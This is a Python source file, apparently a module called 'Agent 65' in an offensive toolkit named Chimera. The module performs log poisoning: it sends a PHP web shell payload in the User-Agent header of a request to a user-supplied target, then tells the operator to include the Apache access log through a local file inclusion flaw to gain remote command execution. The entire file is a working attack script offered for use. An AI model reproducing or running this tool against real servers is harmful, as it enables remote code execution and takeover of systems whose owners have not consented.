import os
import sys
import requests

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[31m" + "="*60)
    print("   CHIMERA AGENT 65 :: LOG_POISONER (RCE PREP)")
    print("="*60 + "\033[0m")

    target_url = input("[?] Target URL (e.g., http://10.0.2.15/index.php): ").strip()
    
    # This payload is a simple PHP 'system' command masquerading as a User-Agent
    payload = "<?php system($_GET['cmd']); ?>"
    
    print(f"[*] Poisoning Apache/Nginx logs on {target_url} via User-Agent...")

    try:
        # We send the PHP code in the User-Agent header. 
        # When the server logs this request, it writes our code to access.log.
        headers = {'User-Agent': payload}
        requests.get(target_url, headers=headers, timeout=5)
        
        print("\033[92m[+] Payload injected into logs.\033[0m")
        print("[*] Next Step: Use an LFI vulnerability to include /var/log/apache2/access.log")
        
        db.report_finding("65_Log_Poisoner", "Log_Poisoning_Attempted", {
            "target": target_url,
            "payload_type": "PHP_System_CMD"
        })
    except Exception as e:
        print(f"[-] Connection failed: {e}")

    db.close()

if __name__ == "__main__":
    run()
